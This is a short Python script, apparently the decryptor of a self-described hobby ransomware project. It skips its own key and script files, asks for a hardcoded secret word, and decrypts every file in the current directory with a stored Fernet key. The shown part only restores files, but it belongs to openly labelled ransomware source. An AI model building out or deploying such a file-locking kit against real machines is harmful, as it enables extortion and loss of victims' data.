#!/usr/bin/env python3 

#THIS CODE IMPORTS THE NECESARY LIBRARIES FOR OUR RANSOMWARE
import os
from cryptography.fernet import Fernet


#THIS CODE SCANS THE DIRECTORY FOR FILES
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "theKey.key" or file == "deCrypt.py":
        continue #This means ignore the voldemort and key file 
    if os.path.isfile(file): # This ignore the Directories, and just uses the files (.txt)
        files.append(file)
print(files)

#THIS CODE USES THE GENERATED KEY THEN READS IT
with open("theKey.key", "rb") as key:
    secretKey = key.read()

#Secret password to decrypt the files 
secretPhrase = "fuck"
userPhrase = input("Enter the secret word to decrypt files\n")

if userPhrase == secretPhrase:
    for file in files:
        with open(file, "rb") as theFile: #rb means Read Binary 
            contents = theFile.read()
        contents_decrypted = Fernet(secretKey).decrypt(contents)
        with open(file, "wb") as theFile:
            theFile.write(contents_decrypted)
        print("Congrats, you got your files back\n")
else:
    print("Sorry wrong word\n")


